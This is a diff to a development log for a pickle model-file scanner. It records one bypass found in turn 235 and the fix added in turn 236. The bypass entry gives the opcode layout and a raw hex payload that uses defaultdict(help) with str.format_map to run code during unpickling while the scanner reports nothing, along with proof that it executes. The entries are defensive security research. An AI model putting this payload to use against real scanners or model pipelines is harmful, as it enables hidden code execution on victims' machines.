@@ -14131,3 +14131,194 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3740 passed, 1022 skipped, 21 warnings in 50.89s`.
+
+## Turn 235 - Bypass via `str.format_map` mapping lookup default factory
+
+Found a scanner-clean RCE-capable bypass in the sibling format API that performs
+mapping lookups. The native engine now models `str.format(...)` format protocol
+dispatch, but `builtins.str.format_map` can also call attacker-controlled
+mapping behavior during unpickling. The payload constructs
+`collections.defaultdict(builtins.help)`, then invokes
+`str.format_map("{x}", mapping)`. The missing field lookup calls the
+`defaultdict` factory with no arguments; `builtins.help()` enters
+`_sitebuiltins._Helper.__call__`, which imports `pydoc`. A shadow `pydoc.py` at
+the front of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL collections defaultdict
+STACK_GLOBAL builtins help
+TUPLE1
+REDUCE              # construct defaultdict(help)
+MEMOIZE
+POP
+STACK_GLOBAL builtins str.format_map
+MARK
+SHORT_BINUNICODE "{x}"
+BINGET 0
+TUPLE
+REDUCE              # "{x}".format_map(defaultdict(help)) calls help()
+STOP
+```
+
+Raw payload:
+
+```text
+80048c0b636f6c6c656374696f6e738c0b64656661756c7464696374938c086275696c74696e738c0468656c7093855294308c086275696c74696e738c0e7374722e666f726d61745f6d617093288c037b787d680074522e
+```
+
+Scanner proof:
+
+```text
+payload_len 88
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': 'collections', 'name': 'defaultdict',
+   'import_reference': 'collections.defaultdict', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'help',
+   'import_reference': 'builtins.help', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'str.format_map',
+   'import_reference': 'builtins.str.format_map', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 47, 'positional_arg_count': 1},
+  {'module': 'builtins', 'name': 'str.format_map',
+   'opcode_position': 86, 'positional_arg_count': 2},
+)
+call_graph None
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and provided a minimal
+`help` object returning `"factory-value"`.
+
+Why it bypasses:
+
+- Native policy does not mark `collections.defaultdict`, `builtins.help`, or
+  `builtins.str.format_map` as dangerous.
+- The native stack model already remembers `defaultdict(default_factory)`, but
+  only treats `operator.getitem(defaultdict, key)` as a hidden factory call.
+- `builtins.str.format_map(format_string, mapping)` is recorded as a normal
+  callable invocation and does not emit a synthetic mapping-lookup callback.
+- The Python call graph already knows that an invoked `builtins.help` maps to
+  `_sitebuiltins._Helper.__call__`, which reaches `builtins.__import__`; it just
+  never receives invocation metadata for the hidden factory call.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Extend native protocol-dispatch modeling to cover
+  `builtins.str.format_map(format_string, mapping)`.
+- For the current tracked source, if the mapping argument is
+  `StackValue::DefaultDict { default_factory }`, emit an invocation of the
+  default factory with `positional_arg_count=0`.
+- A broader version can model `mapping.__getitem__` / `mapping.__missing__` for
+  tracked constructed mappings, but the minimal high-signal source fix is the
+  existing `DefaultDict` stack value plus `str.format_map`.
+- Keep the check stack-local and finite, alongside the existing
+  `str.format`/`format` dispatch helpers.
+
+Performance note:
+
+- Payload size is 88 bytes.
+- Warm scan median over 100 runs was `0.000055s` with max `0.000062s`.
+- A fix only needs to inspect already-extracted reducer arguments for the
+  single callable `builtins.str.format_map`.
+
+## Turn 236 - Defense for `str.format_map` default-factory lookup
+
+Implemented the source-level block for Turn 235 by extending the native
+format-dispatch model again, this time for mapping lookup. The scanner now
+treats `builtins.str.format_map(format_string, mapping)` as a finite dispatcher
+that can invoke a tracked `collections.defaultdict` default factory when a
+replacement field is missing.
+
+Fix details:
+
+- Added `builtins.str.format_map` handling next to the existing
+  `builtins.format` and `builtins.str.format` dispatch helpers.
+- The new path requires exactly two arguments and a tracked string-like format
+  string, then checks whether the mapping argument is the existing
+  `StackValue::DefaultDict { default_factory }`.
+- When that shape is present, native metadata emits the default factory as a
+  synthetic zero-argument callable invocation.
+- Reused a small zero-argument invocation helper for both
+  `operator.getitem(defaultdict, key)` and `str.format_map(..., defaultdict)`.
+- The Python call graph already aliases `builtins.help()` to
+  `_sitebuiltins._Helper.__call__`, so the hidden import-execution path is
+  caught once native metadata names the factory invocation.
+
+Regression coverage:
+
+- `test_scan_bytes_blocks_format_map_defaultdict_factory_rce` verifies
+  `defaultdict(help)` construction remains clean.
+- The same test verifies `str.format_map("{x}", defaultdict(help))` is
+  malicious, records a zero-argument `builtins.help` invocation, and executes
+  the payload in a child interpreter with a shadow `pydoc.py`.
+
+Post-fix proof:
+
+```text
+payload_len 88
+scan malicious complete findings 1
+callable_invocations (
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 47, 'positional_arg_count': 1},
+  {'module': 'builtins', 'name': 'str.format_map',
+   'opcode_position': 86, 'positional_arg_count': 2},
+  {'module': 'builtins', 'name': 'help',
+   'opcode_position': 86, 'positional_arg_count': 0},
+)
+dangerous (('_sitebuiltins', '_Helper.__call__', 'builtins.__import__'),)
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+warm_median 0.000122
+warm_max 0.000214
+```
+
+Performance note:
+
+- The new check is stack-local and only inspects already-extracted
+  `builtins.str.format_map` reducer arguments.
+- Warm scan median for the fixed 88-byte payload was `0.000122s` over 100
+  runs.
+
+Validation:
+
+- Rust formatting: `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused `str.format_map` regression: `1 passed in 0.35s`.
+- Focused import/call-graph regression file: `26 passed in 1.03s`.
+- Focused call-graph suite: `64 passed in 2.92s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.35s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3741 passed, 1022 skipped, 21 warnings in 49.54s`.
